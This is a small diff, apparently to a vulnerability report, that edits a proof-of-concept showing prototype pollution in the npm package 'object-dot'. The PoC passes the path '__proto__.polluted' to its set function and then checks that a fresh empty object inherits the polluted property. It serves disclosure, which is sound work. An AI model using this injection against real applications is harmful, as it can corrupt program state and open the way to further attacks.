@@ -10,9 +10,9 @@
 // poc.js
 var objectDot = require("object-dot")
 var obj = {}
-console.log("Before : " + obj.polluted);
+console.log("Before : " + {}.polluted);
 objectDot.set(obj, '__proto__.polluted', 'Yes! Its Polluted');
-console.log("After : " + obj.polluted);
+console.log("After : " + {}.polluted);
 ```
 
 
